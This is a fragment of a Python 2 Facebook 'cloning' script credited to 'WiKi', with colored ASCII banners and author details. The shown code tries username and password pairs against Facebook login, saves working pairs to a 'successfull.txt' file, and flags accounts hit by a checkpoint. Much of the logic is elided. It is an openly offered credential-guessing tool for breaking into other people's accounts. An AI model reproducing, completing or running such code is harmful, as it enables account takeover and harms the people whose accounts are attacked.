...
print("""
\033[0;96m  ____      ____  _   ___  ____    _   
\033[0;96m|_  _|    |_  _|(_) |_  ||_  _|  (_)  
\033[0;96m   \ \  /\  / /  __    | |_/ /    __   
\033[0;96m     \ \/  \/ /  [  |   |  __'.   [  |  
\033[0;96m      \  /\  /    | |  _| |  \ \_  | |  
\033[0;96m        \/  \/    [___]|____||____|[___] 
 
""")

print("\033[0;91mA Free Tools By WiKi")

psb('\x1b[1;92mWait Cloning is Starting .....')
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : MOHAMMAD MARUFUL AHAMED'
    print '\033[0;94mFACEBOOK : محمد محب' 
    print '\033[0;96mGITHUB   : WiKi9'
    print ''
    print '\033[0;90mONLY BANGLADESH'
    print '\033[0;91m'
    print 50* '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[WiKi--OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[WiKi--CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
